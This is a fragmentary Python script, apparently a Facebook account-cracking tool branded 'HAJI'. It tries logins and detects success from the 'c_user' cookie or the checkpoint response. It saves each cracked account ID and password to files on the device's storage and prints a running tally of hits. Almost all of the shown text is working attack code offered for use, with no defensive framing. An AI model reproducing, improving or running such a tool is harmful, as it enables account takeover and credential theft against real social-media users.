...
oks = []
twf = [] 
os.system('xdg-open https://chat 03148007918')
def clear():
    os.system('clear')
logo =("""\
 /$$   /$$  /$$$$$$     /$$$$$ /$$$$$$$$ /$$$$$$$$ /$$$$$$$ 
...
response = requests.get(
    ...
    headers=headers,
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/HAJI-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/HAJI-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            elif '/x/checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\33[1;31m[HAJI💔]  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                #open('/sdcard/HAJI-CP.txt', 'a').write( cid+' | '+ps+' \n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s|HAJI-OK:\033[1;32m%s\033[1;37m:\033[1;31m%s\033[1;37m '%(loop,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
